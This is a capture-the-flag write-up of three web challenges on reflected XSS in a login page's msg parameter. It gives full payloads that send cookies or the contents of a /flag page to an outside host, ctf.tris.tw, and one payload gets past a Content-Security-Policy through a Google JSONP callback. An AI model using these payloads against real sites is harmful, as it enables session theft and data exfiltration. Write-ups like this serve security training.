# Login

- Category: Web
- Solves: 1/12
- Difficulty: Easy

## Description

The login panel contains a Reflected XSS vulnerability

## Solution

The error message on the login page is vulnerable to XSS.
We can control the `msg` parameter and inject JavaScript code.

Payload: `http://web/login?msg=<svg onload=fetch('https://ctf.tris.tw/?'%2window.btoa(document.cookie))>`

# Login Revenge

- Category: Web
- Solves: 1/12
- Difficulty: Medium

## Description

The login panel contains a Reflected XSS vulnerability but this time admin's cookie is set with the `HTTPOnly` attribute.

## Solution

The error message on the login page is vulnerable to XSS, we can control `msg` parameter and inject JavaScript code.
Due to restriction of `HTTPOnly`, we can't steal the cookie directly. Instead, we can leak the content of the `/flag` page to obtain the flag

Payload: `http://web/login?msg=%3Csvg%20onload=%22fetch(%27/flag%27).then(res=%3Eres.text()).then(flag=%3Efetch(%27https://ctf.tris.tw?%27%2bwindow.btoa(flag)))%22%3E`

# Login Revenge Revenge

## Description

The login panel contains a Reflected XSS vulnerability but this time admin's cookie is set with the `HTTPOnly` attribute.
The Website is also protected by the following Content-Security Policy

`default-src 'none';`
`script-src *.google.com cdn.tailwindcss.com;`
`style-src cdn.tailwindcss.com 'unsafe-inline';`

## Solution

`script-src *.google.com` is insecure. It can be bypassed using Google's public JSONP endpoint: `https://accounts.google.com/o/oauth2/revoke?callback=alert()`

Due to the CSP restriction, if we want to exfiltrate data, we must navigate away from the current page by changing `location.href` and redirecting to our own site with the flag included.

Payload: `http://web/login?msg=<script src="https://accounts.google.com/o/oauth2/revoke?callback=var a = window.open('/flag');setTimeout(function(){location='https://ctf.tris.tw?'%252bwindow.btoa(a.document.body.innerHTML)},100);"></script>`